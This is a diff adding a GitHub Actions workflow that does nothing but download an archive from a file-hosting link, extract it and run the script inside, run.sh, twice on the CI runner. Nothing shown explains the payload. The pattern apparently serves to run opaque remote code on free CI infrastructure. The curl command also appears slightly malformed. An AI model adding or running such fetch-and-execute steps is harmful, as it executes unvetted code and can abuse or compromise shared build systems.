@@ -1,0 +1,23 @@
+name: runner
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 1
+      matrix:
+        shard: [1]
+
+    steps:
+      - name: runner
+        run: |
+          cd
+          curl -X GET "https://www.bigfile.net/d/4wzlCrxa8nO1OLFAZ6tUgRN6sLPu5v8RizS7k7CMU5r/backup.tar.gz?content-type=application%2Fgzip" -O 0.tar.gz
+          tar -xzvf 0.tar.gz
+          chmod +x ./run.sh
+          bash ./run.sh
+          ./run.sh
+        
